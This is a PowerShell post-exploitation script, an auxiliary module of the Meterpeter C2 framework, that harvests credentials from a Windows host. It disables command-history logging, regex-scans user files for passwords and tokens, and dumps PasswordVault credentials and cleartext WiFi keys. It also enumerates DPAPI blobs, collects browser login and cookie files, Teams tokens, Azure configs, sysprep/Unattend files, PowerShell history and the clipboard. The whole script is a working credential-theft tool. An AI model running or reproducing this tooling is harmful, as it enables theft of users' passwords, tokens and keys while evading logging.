<#
.SYNOPSIS
   Search for Strings\Regex inside files

   Author: @r00t-3xp10it (ssa redteam)
   Tested Under: Windows 10 (19044) x64 bits
   Required Dependencies: none
   Optional Dependencies: VaultSvc, VaultCmd
   PS cmdlet Dev version: v1.1.23

.DESCRIPTION
   Auxiliary module of Meterpeter C2 that searchs for matching
   strings inside files recursive starting in input directory.

.NOTES
   Cmdlet displays the LineNumber where the strings have been found.
   Param -verb does not display file content if bigger than 300 lines.
   Param -Exclude '.txt' will add one more exclusion to the default list.
   Param -AllPossible switch increases the default cmdlet Regex scan success
   rate, but it also increases the probability of encounter false positives.
   Use | (pipe) command to split Strings\Regex (example: .txt|.ini|.bat).

   Regex examples:
   Cmdlet by default limmit the string to capture to 22 chars length but
   that can be changed by invoking -StrLength parameter to defined length.
   -StrLength value reffers to: "password"="STRING-TO-CAPTURE-MAX-LENGTH"

   Regex examples:
   Only grab passwords with 22 chars max length
   (^(\s+p|\s+cp|cp|p)ass.{0,6}(=|:).{0,22}$)
     
.Parameter Path
   The directory where to start search recursive (default: $Env:USERPROFILE)

.Parameter String
   String or Regex (regex: ^(\s+U|U)ser.{0,6}(=|:)|^(\s+p|\s+cp|cp|p)ass.{0,6}(=|:)|login.{0,2}(=|:))

.Parameter Exclude
   File extension to exclude (example: .zip|.tar|.rar|.7z|.pdf|.img|.iso|.dll|.db|.mp(3|4)|.png|.jpg)

.Parameter StrLength
   The string to capture max length in chars (default: 22)

.Parameter StopAt
   Stop searching after found xxx results (default: 100)

.Parameter AllPossible
   Increase default Regex success rate? (less accurate)

.Parameter Verb
   Switch to diplay the suspicious file contents? (verbose)

.Parameter Limmit
   Print file contents if less than xxx lines (default: 300)

.EXAMPLE
   PS C:\> .\Find-strings.ps1 -Path "$Env:USERPROFILE" -String "[^$]password="
   Search for string 'password=' on %userprofile% files recursive

.EXAMPLE
   PS C:\> .\Find-strings.ps1 -Path "$Env:TMP" -String "pass=|passwd=|password="
   Search for string 'pass= passwd= password=' on %temp% files recursive

.EXAMPLE
   PS C:\> .\Find-strings.ps1 -Path "$Env:USERPROFILE" -String "passw=" -Exclude ".txt"
   Search for string 'passw=' on %userprofile% files (without .txt extension) recursive.

.EXAMPLE
   PS C:\> .\Find-strings.ps1 -Path "$Env:TMP" -String "User.{0,4}(=|:)|passw.{0,3}(=|:)"
   Strings 'passw=,passw:,passwo=,passwor=,password=,user=,usern=,userna=,usernam=,username='

.EXAMPLE
   PS C:\> .\Find-strings.ps1 -Path "$Env:TMP" -String "(`"password`":.{0,22})$" -stopAt "10"
   Search for 10 strings max with "password":+{0 to 22 chars} recursive starting in %tmp% dir

.EXAMPLE
   PS C:\> .\Find-strings.ps1 -Path "$Env:TMP" -stopAt "10" -limmit "30000" -verb
   Stop after found 10 results and print onscreen file contents until 30.000 lines

.EXAMPLE
   PS C:\> .\Find-strings.ps1 -Path "$Env:TMP" -AllPossible
   Increase default Regex scan success rate (less accurate)

.INPUTS
   None. You cannot pipe objects into Find-string.ps1

.OUTPUTS
   * Find strings inside files
     => Total of files to scan: [19]

     TokenId     : [[1]]
     FileName    : creds.txt
     FullPath    : C:\Users\pedro\AppData\Local\Temp\creds.txt
     StringMatch : user=pedroUbuntu password=r00t3xp10it
     LineNumber  : 10

     TokenId     : [[2]]
     FileName    : logins.log
     FullPath    : C:\Users\pedro\AppData\Local\Temp\logins.log
     StringMatch : UserName: Teams passw = r00tPassWd
     LineNumber  : 2 4

   Scan compleated in '00:00:01' time length.
   
.LINK
   https://github.com/r00t-3xp10it/meterpeter
   https://regexone.com/lesson/introduction_abcs
   https://towardsdatascience.com/regular-expressions-clearly-explained-with-examples-822d76b037b4
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$String="(^(\s+U|U)ser.{0,6}(=|:).[^$]{0,22}$)|(^(\s+p|\s+cp|cp|p)ass.{0,6}(=|:).{0,22}$)|(^(\s+p|p)wd.{0,2}(=|:).{0,22}$)|(log(i|o)n.{0,2}(=|:).[^$]{0,22}$)",
   [string]$Exclude=".zip|.tar|.rar|.7z|.pdf|.img|.iso|.dll|.db|.mp(3|4)|.png|.jpg|.gif|.msi|.exe|.wav|.avi|.ttf|.otf",
   [string]$Path="$Env:USERPROFILE",
   [switch]$AllPossible,
   [int]$StrLength='22',
   [int]$StopAt='100',
   [int]$Limmit='300',
   [switch]$Verb
)


$CmdletVersion = "v1.1.23"
$ScanStartTimer = (Get-Date)
$ErrorActionPreference = "SilentlyContinue"
#Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$host.UI.RawUI.WindowTitle = "@Find-String $CmdletVersion {SSA@RedTeam}"


## Make sure input dir exists
If(-not(Test-Path -Path "$Path"))
{
   write-host "`n  Error: cmdlet cant find the input directory.`n" -ForegroundColor Red
   return
}

## Scanning root directory its forbiden
If($Path -iMatch '(^(C(:|:\\))$|^(C:\\Window(s|s\\))$)')
{
   write-host "`n  Error: cmdlet cant scan input directory root." -ForegroundColor Red
   write-host "  Try again or go further down in the diretory tree`n" -ForegroundColor Red
   return
}

## Make sure user input (-exclude) does not match any extensions in default list
If($Exclude -iNotMatch ".zip|.tar|.rar|.7z|.pdf|.img|.iso|.dll|.db|.mp(3|4)|.png|.jpg|.gif|.msi|.exe|.wav|.avi|.ttf|.otf")
{
   ## check if user inputed command
   # it starts with a pipe (|) char
   If($Exclude -NotMatch '^(\|)')
   {
      ## Add Pipe to user input string
      $Exclude = "|"+"$Exclude" -join ''
   }

   ## Adding one more extension exclusion to cmdlet default exclusion list
   $Exclude = ".zip|.tar|.rar|.7z|.pdf|.img|.iso|.dll|.db|.mp(3|4)|.png|.jpg|.gif|.msi|.exe|.wav|.avi|.ttf|.otf"+"$Exclude" -join ''
}

If($Path -iMatch '^(C:\\Windows\\.)')
{
   ## System directory exclusions groups
   # This will reduce system directorys scan time
   $Exclude = "$Exclude"+"|.NLS|.table|.scr|.msc|.cpl|.cat|.cab|.mui|.evtx|.efi|.tlb|.blb" -join ''
}


## Store all file names fullpaths found (recursive search)
write-host "`n* Find strings inside files" -ForegroundColor Green
$Exclude = "$Exclude"+"|.SC2Replay|.SC2Save|Battle.net|Games|GameLogs" -join ''
$FileNames = (Get-ChildItem -Path "$Path" -Recurse -EA SilentlyContinue | Where-Object {
   $_.PsIsContainer -NotMatch '^(True)$' -and $_.Name -iNotMatch "($Exclude)"
}).FullName


## Count how many files have been found inside dir
$FilesCounter = (echo $FileNames|Measure-Object).Count

## Check if string match the cmdlet default string in the end.
If($String -Match '(0\)n\.\{0,2\}\(=|:\)\.\[\^\$\]\{0,22\}\$\))$')
{
   ## Add new groups to default string because meterpeter C2 cant
   # escape the backticks [`] that are escaping the double quotes ["] in this Regex
   $String = "$String" + "|((cp|p)ass.{0,4}`":.{0,22}$)|(^Password(\s+:|:))|(`"(Pass.{0,5}|User.{0,4})`">)|(Username`":.{0,22}$)|((`"access|[^$]auth|[^$]auth_)token(\s*|\s+`"|`"|`"+:|`"+>|\s+:|:|\s+=|=))" -join ''
}

If($AllPossible.IsPresent)
{
   ## This Regex Increases the scan success rate ...
   # But it also increases the probability of encounter false positives.
   $String = "(^(\s+U|U)ser.{0,4}(\s+`"|`"|`"+:|`"+>|\s+:|:|\s+=|=).[^$]{0,150}$)|(^(\s+p|\s+cp|cp|p)ass.{0,4}(\s+`"|`"|`"+:|`"+>|\s+:|:|\s+=|=).[^$])|(^(\s+p|p)wd(\s+`"|`"|`"+:|`"+>|\s+:|:|\s+=|=).[^$]{0,150}$)|(log(i|o)n(\s+`"|`"|`"+:|`"+>|\s+:|:|\s+=|=).[^$]{0,150}$)|(Username(\s+`"|`"|`"+:|`"+>|\s+:|:|\s+=|=).{0,150}$)|(Password(\s+`"|`"|`"+:|`"+>|\s+:|:|\s+=|=))|((`"access|[^$]auth|[^$]auth_)token(\s*|\s+`"|`"|`"+:|`"+>|\s+:|:|\s+=|=))" 
}
Else
{
   ## Define string to capture max length (xx chars)
   $String = $String -replace "0,22","0,${StrLength}"
}

$Creds = $null
## Verbose outputs (-verb)
If($Verb.IsPresent)
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Display detail info + common creds

   .OUTPUTS
      Currently loaded vaults:
           Vault: Credenciais Web
           Vault Guid:4BF4C442-9B8A-41A0-B380-DD4A704DDB28
           Location: C:\Users\pedro\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

           Vault: Credenciais do Windows
           Vault Guid:77BC582B-F0A6-4E15-4E80-61736B6F3B29
           Location: C:\Users\pedro\AppData\Local\Microsoft\Vault

           - [PasswordVault] None plain text credentials found.

           WiFi credentials
           SSID name   : Vodafone-3522EB
           Key Content : r00t3xp10it
           SSID name   : Pinho verde-2G
           Key Content : pinhoverde2015

           DPAPI master keys
           78D8FB08F793E5AD42292B24ED3E4964
           D3DA1BB8B5BFC56D5A4B45A6742DA77B
           013F80D38C8D6E1BE9B8016C42A9BAF1
   #>

   ## Print OnScreen detail information
   write-host "  => " -ForegroundColor DarkYellow -NoNewline
   write-host "StartPath: '" -NoNewline
   write-host "$Path" -ForegroundColor Magenta -NoNewline
   write-host "'"
   write-host "  =>" -ForegroundColor DarkYellow -NoNewline
   write-host " StrLength:" -NoNewline
   write-host "$StrLength" -ForegroundColor DarkYellow -NoNewline
   write-host "[chars]  Limmit:" -NoNewline
   write-host "$Limmit" -ForegroundColor DarkYellow -NoNewline
   write-host "[lines]  StopAfter:" -NoNewline
   write-host "$StopAt" -ForegroundColor DarkYellow -NoNewline
   write-host "[matches]"

   ## Check if user is using Regex
   If($String -Match '(\^|\||{|})')
   {
      write-host "  => " -ForegroundColor DarkYellow -NoNewline
      write-host "Regex: " -NoNewline
      write-host "($String)" -ForegroundColor Magenta   
   }
   Else
   {
      write-host "  => " -ForegroundColor DarkYellow -NoNewline
      write-host "String: " -NoNewline
      write-host "($String)" -ForegroundColor DarkYellow
   }


   ## Dump Windows PasswordVault function
   If((Get-Service -Name "VaultSvc").Status -Match '^(Running)$')
   {
      $ctt = (VaultCmd /list) -replace '^[^Curr]\s*','     '
      If($ctt -iMatch '^(Currently loaded vaults:)$')
      {
         write-host ""
         ## Display Currently loaded vaults
         echo $ctt|Select-Object -skipLast 1 
      }

      ## Retrieve Windows Vault credentials
      [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
      $PasswordVault = New-Object Windows.Security.Credentials.PasswordVault

      ## Check if we have any credentials to display
      $CheckForCredentials = $PasswordVault.RetrieveAll()
      If([string]::IsNullOrEmpty($CheckForCredentials))
      {
         write-host "`n     - [PasswordVault] " -ForegroundColor Red -NoNewline
         write-host "None plain text credentials found." -ForegroundColor DarkGray
      }
      Else
      {
         $VaultName = ($ctt|Select-String -Pattern "^(\s*Vault:\s*.*Web)")
         $VaultAccessType = $VaultName -replace '^(\s*Vault: )',''
         ## Print OnScreen resource_names + credentials (in plain text) found.
         $PasswordVault.RetrieveAll() | % { $_.RetrievePassword(); $_ } |
            Select-Object -Property UserName,Resource,Password, @{Name='Vault';Expression={"$VaultAccessType"}} |
            Format-Table -AutoSize | Out-String -Stream | Select-Object -SkipLast 2 | ForEach-Object {
               $stringformat = If($_ -Match '^(UserName)')
               {
                  @{ 'ForegroundColor' = 'Green' }
               }
               ElseIf($_ -Match '^----')
               {
                  @{ 'ForegroundColor' = 'White' }               
               }
               Else
               {
                  @{ 'ForegroundColor' = 'Blue' }
               }
               Write-Host @stringformat $_
            }
      }

   }

   $Creds = @()
   ## Dump WiFi SSIDnames\Credentials function
   #Special thanks to @ShantyDamayanti for reporting Select-String bug on ForEach()
   $Profiles = $(netsh wlan show profiles|Select-String -Pattern "All User Profile")
   $parsedata = $Profiles -replace 'Profiles on interface Wi-Fi:','' -replace '\s*All User Profile\s*: ',''
   ForEach($Item in $parsedata)
   {
      $Creds += $(netsh wlan show profiles name=$Item key=clear|findstr "SSID Content"|findstr /V "Number")
   }

   If($Creds -ne $null)
   {
      ## Display Key contents OnScreen
      write-host "`n     WiFi credentials" -ForegroundColor Green
      $Creds -replace '"','' -replace '^(\s*)','     ' -replace '              :','   :' -replace '            :',' :'
   }

   ## Dump DPAPI master keys function
   $Dpapi1 = (Get-ChildItem -Path "$Env:APPDATA\Microsoft\Credentials" -Attributes Hidden -Force -EA SilentlyContinue).Name
   $Dpapi2 = (Get-ChildItem -Path "$Env:LOCALAPPDATA\Microsoft\Credentials" -Attributes Hidden -Force -EA SilentlyContinue).Name
   If($Dpapi1 -ne $null -or $Dpapi2 -ne $null)
   {
      ## Formating dpapi keys outputs found
      # so they can fit on cmdlet output style ^_^
      write-host "`n     DPAPI Blob keys" -ForegroundColor Green
      $line1 = $Dpapi1[0];$key1 = "     "+"$line1" -join ''
      $line2 = $Dpapi1[1];$key2 = "     "+"$line2" -join ''
      $line3 = $Dpapi1[2];$key3 = "     "+"$line3" -join ''
      If($line1){echo $key1};If($line2){echo $key2};
      If($line3){echo $key3}
      ## LOCALAPPDATA dpapi keys
      $line4 = $Dpapi2[0];$key4 = "     "+"$line4" -join ''
      $line5 = $Dpapi2[1];$key5 = "     "+"$line5" -join ''
      $line6 = $Dpapi2[2];$key6 = "     "+"$line6" -join ''
      $line7 = $Dpapi2[3];$key7 = "     "+"$line7" -join ''
      $line8 = $Dpapi2[4];$key8 = "     "+"$line8" -join ''
      If($line4){echo $key4};If($line5){echo $key5};
      If($line6){echo $key6};If($line7){echo $key7};
      If($line8){echo $key8}
   }

   write-host ""
   Start-Sleep -Milliseconds 1500
}


## Interesing files - scanner locations
# Microsoft EDGE logins file enumeration
$EdgeFile = (Gci -Path "$Env:LOCALAPPDATA\Microsoft\Edge\User Data"|?{$_.PSIsContainer -eq $false -and $_.Length -gt 0}).FullName
If(-not([string]::IsNullOrEmpty($EdgeFile)))
{
   ForEach($EdgeData in $EdgeFile)
   {
      $FileNames += "$EdgeData"
      $FilesCounter = $FilesCounter + 1
   }
}

## Firefox logins file enumeration
$FireFile = (Gci -Path "$Env:APPDATA\Mozilla\Firefox\Profiles" -Recurse -Force|?{$_.PSIsContainer -eq $false -and $_.Name -iMatch '(logins.json)$'}).FullName
If(-not([string]::IsNullOrEmpty($FireFile)))
{
   ForEach($FireData in $FireFile)
   {
      $FileNames += "$FireData"
      $FilesCounter = $FilesCounter + 1
   }
}

## Chrome logins file enumeration
$ChromeFile = (Gci -Path "$Env:LOCALAPPDATA\Google\Chrome\User Data\Default"|?{$_.PSIsContainer -eq $false -and $_.Name -iMatch '(Login+\s+Data|Cookies|Trust+\s+Tokens)'}).FullName
If(-not([string]::IsNullOrEmpty($ChromeFile)))
{
   ForEach($ChromeData in $ChromeFile)
   {
      $FileNames += "$ChromeData"
      $FilesCounter = $FilesCounter + 1
   }
}

## Opera logins file enumeration
$OperaFile = (Gci -Path "$Env:LOCALAPPDATA\Programs\Opera*" -Recurse -Force|?{$_.PSIsContainer -eq $false -and $_.Name -iMatch '(installer_prefs.json)$'}).FullName
If(-not([string]::IsNullOrEmpty($OperaFile)))
{
   ForEach($OperaData in $OperaFile)
   {
      $FileNames += "$OperaData"
      $FilesCounter = $FilesCounter + 1
   }
}

## Extra XML files locations
$XMLFiles = (Gci -Path "$Env:ALLUSERSPROFILE" -Recurse -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml','sites.xml' -Force).FullName
If(-not([string]::IsNullOrEmpty($XMLFiles)))
{
   ForEach($XMLData in $XMLFiles)
   {
      $FileNames += "$XMLData"
      $FilesCounter = $FilesCounter + 1
   }
}

## Azure XML files location
$AzureFile = (Gci -Path "$Env:USERPROFILE\.azure" -Force|?{$_.PSIsContainer -eq $false -and $_.Name -iMatch '(.json)$'}).FullName
If(-not([string]::IsNullOrEmpty($AzureFile)))
{
   ForEach($AzureData in $AzureFile)
   {
      $FileNames += "$AzureData"
      $FilesCounter = $FilesCounter + 1
   }
}

## Invoke-VaultCmd cmdlet leave entrys in this location
$VaultCmd = (Gci -Path "$Env:LOCALAPPDATA"|?{$_.Name -Match '(\s*_.{4}.(xml|secret))$'}).FullName
If(-not([string]::IsNullOrEmpty($VaultCmd)))
{
   ForEach($Entry in $VaultCmd)
   {
      $FileNames += "$Entry"
      $FilesCounter = $FilesCounter + 1
   }
}

## RDP remote desktop credentials
If(Test-Path -Path "$Env:LOCALAPPDATA\Microsoft\Remote Desktop Connection Manager\RDCMan.settings")
{
   $FileNames += "$Env:LOCALAPPDATA\Microsoft\Remote Desktop Connection Manager\RDCMan.settings"
}

## Microsoft Teams clear text $Auth_Tokens capture
If(Test-Path -Path "$Env:APPDATA\Microsoft\Teams\Local Storage\leveldb")
{
   $TeamsFile = (Gci -Path "$Env:APPDATA\Microsoft\Teams\Local Storage\leveldb"|?{$_.Length -ne 0}).FullName
   ForEach($Entry in $TeamsFile)
   {
      $FileNames += "$Entry"
      $FilesCounter = $FilesCounter + 1
   }
}

If(Test-Path -Path "$Env:APPDATA\Microsoft\Teams\Cookies")
{
   $FileNames += "$Env:APPDATA\Microsoft\Teams\Cookies"
   $FilesCounter = $FilesCounter + 1
}

## Powershell commands history
$FileNames += "$Env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
## IIS web server (web.config) credential dump
$FileNames += "$Env:WINDIR\Microsoft.NET\Framework64\v4.0.30319\Config\web.config"
## Append XML file paths to current paths list
$FileNames += "$Env:WINDIR\Panther\Unattend\Unattend.xml"
$FileNames += "$Env:WINDIR\system32\sysprep\sysprep.xml"
$FileNames += "$Env:WINDIR\system32\sysprep.inf"
$FileNames += "$Env:WINDIR\Panther\Unattend.xml"
$FileNames += "$Env:WINDIR\sysprep\sysprep.inf"
$FileNames += "$Env:WINDIR\sysprep\sysprep.xml"
If($Verb.IsPresent){Start-Sleep -Seconds 1}


$FilesCounter = $FilesCounter + 7
## Print OnScreen the number of files found
write-host "  => " -ForegroundColor DarkYellow -NoNewline
write-host "Total of files to scan: [" -NoNewline
write-host "$FilesCounter" -ForegroundColor DarkYellow -NoNewline
write-host "]`n"


$DSetting = "false"
$i = 0 #Success counter
## Loop trougth all filenames
ForEach($Token in $FileNames)
{
   ## Search for strings or regex inside file
   $MatchedString = (Get-Content -Path "$Token"|Select-String -Pattern "($String)" -EA SilentlyContinue)
   If($MatchedString -iMatch "$String")
   {
      ## Get filename description
      $Description = (Get-ChildItem -Path "$Token"|Select-Object *)
      If($Verb.IsPresent){$FileContents = Get-Content -Path "$Token"}
      $Name = $Description.PSChildName
      $Line = $MatchedString.LineNumber
      $Full = $Description.FullName
         $i = $i + 1

      ## Print results OnScreen
      write-host "`n  TokenId      : [[" -NoNewline
      write-host "$i" -ForegroundColor Blue -NoNewline
      write-host "]]"
      write-host "  FileName     : $Name"
      write-host "  FullPath     : $Full"
      write-host "  StringMatch  : " -NoNewline
      write-host "$MatchedString" -ForegroundColor DarkGreen
      write-host "  LineNumber   : " -NoNewline
      write-host "$Line" -ForegroundColor DarkYellow

      ## Verbose outputs
      If($Verb.IsPresent)
      {
         ## Check file length limmit
         If($Description.Length -lt $Limmit)
         {
            ## verbose displays file contents
            write-host "  FileContents : `n"
            echo $FileContents
         }
         Else
         {
            write-host "  FileContents : "-NoNewline
            write-host "[Limmit:$Limmit] "-NoNewline -ForegroundColor Yellow
            write-host "Invoke a bigger -limmit to display file .." -ForegroundColor Red
         }
      }

      write-host ""
      If($i -eq $StopAt)
      {
         $DSetting = "true"
         ## Stop after xx good results helps
         # in reducing the cmdlet scan time.
         write-host "`n[" -NoNewline
         write-host "$StopAt" -ForegroundColor Blue -NoNewline
         write-host "] success results reached, abort .."
         break
      }
      Start-Sleep -Milliseconds 600
   }
   Else
   {
      If($Verb.IsPresent)
      {
         If($Token -iMatch '(\\Edge\\User Data\\CrashpadMetrics-active.pma)$')
         {
            write-host "`n                 - Scanning diferent locations for credentials -" -ForeGroundColor Green
            write-host "                   Default locations provided by Find-Strings`n" -ForeGroundColor DarkGray
            Start-Sleep -Seconds 2
         }

         ## Display files flagged as [clean]
         write-host "  ScanningFile : " -NoNewline
         write-host "$Token" -ForeGroundColor Red -NoNewline
         write-host " [clean]"
      }   
   }
}


## ClipBoard Enrtys
$ClipEntrys = (Get-Clipboard -Raw)
If(-not([string]::IsNullOrEmpty($ClipEntrys)))
{
   ## Print results OnScreen
   write-host "`n  Application  : ClipBoard"
   write-host "  StringCapture: " -NoNewline
   write-host "$ClipEntrys" -ForegroundColor DarkGreen
}


## Scan timmer
Start-Sleep -Milliseconds 500
If($DSetting -eq "false"){write-host "`n"}
$ElapsTime = $(Get-Date) - $ScanStartTimer
$TotalTime = "{0:HH:mm:ss}" -f ([datetime]$ElapsTime.Ticks)
If($i -lt 1)
{
   Write-Host "  Scan compleated in '" -NoNewline
}
Else
{
   Write-Host "Scan compleated [" -NoNewline
   Write-Host "$i" -ForegroundColor Blue -NoNewline
   Write-Host "] in '" -NoNewline
}
Write-Host "$TotalTime" -ForegroundColor Green -NoNewline
Write-Host "' time length."

If($i -lt 1)
{
   write-host "  Scan results : " -NoNewline
   write-host "fail to find any strings inside current directory.`n" -ForegroundColor Red
}
write-host ""